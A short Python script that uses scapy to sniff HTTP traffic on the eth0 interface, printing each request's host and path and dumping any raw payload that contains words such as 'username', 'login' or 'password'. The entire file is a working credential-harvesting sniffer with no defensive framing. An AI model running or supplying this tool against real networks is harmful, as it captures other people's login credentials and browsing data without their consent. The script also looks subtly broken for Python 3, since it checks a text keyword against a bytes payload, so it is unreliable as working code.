#!/usr/bin/env python3
import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = str(packet[http.HTTPRequest].Host) + str(packet[http.HTTPRequest].Path)
        print(url)

        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keywords = ["username", "user", "login", "password", "pass"]
            for keyword in keywords:
                if keyword in load:
                    print(load)
                    break


sniff("eth0")